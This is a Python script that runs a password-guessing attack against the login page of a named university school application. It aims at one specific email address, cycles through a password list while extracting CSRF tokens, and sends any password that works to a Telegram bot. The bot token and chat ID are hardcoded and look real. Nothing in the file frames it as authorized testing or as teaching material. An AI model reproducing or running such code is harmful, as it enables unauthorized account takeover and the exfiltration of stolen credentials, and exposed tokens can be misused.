import requests
from bs4 import BeautifulSoup
import telegram
import asyncio

# Define your bot's token
bot_token = "6398640970:AAG0qx_U05VGJGorP5UtulM-ernxAhTon8Q"  # Replace with your actual bot token

bot = telegram.Bot(token=bot_token)

# Define the login URL and the known email address
login_url = "http://schoolapp.ensam-umi.ac.ma/schoolapp/login"
email = "craccro@gmail.com"

# Define the chat ID for Telegram notifications
chat_id = "900751983"  # Replace with your chat ID

async def send_notification(message):
    await bot.send_message(chat_id=chat_id, text=message)

# Load a list of passwords from a file
with open("passes.txt", "r", encoding="utf-8") as password_file:
    passwords = password_file.readlines()

# Iterate through the list of passwords
for password in passwords:
    # Strip any leading/trailing whitespace or newline characters
    password = password.strip()

    session = requests.Session()

    response = session.get(login_url)

    # Parse the HTML response
    soup = BeautifulSoup(response.text, "html.parser")

    # Locate the CSRF token element (assuming it's in a hidden input field)
    csrf_token_element = soup.find("input", {"name": "_csrf"})

    # Extract the CSRF token value
    csrf_token = csrf_token_element["value"]

    # Prepare login data with the current password
    login_data = {
        "_csrf": csrf_token,
        "email": email,
        "password": password,
    }

    # Send a POST request for login
    response = session.post(login_url, data=login_data)

    # Check the status code (optional)
    if response.status_code == 200:  # You can replace 200 with the expected status code
        # Parse the HTML response
        soup = BeautifulSoup(response.text, "html.parser")

        # Check for the presence of the error message
        error_message = soup.find("p", {"style": "color:red;"})

        if error_message:
            # Error message found, login was incorrect
            print(f"Login failed with password: {password}")
        else:
            # No error message found, login was successful
            message = f"Login successful with password: {password}"
            asyncio.run(send_notification(message))
            break
    else:
        print(f"Request failed with status code: {response.status_code}")
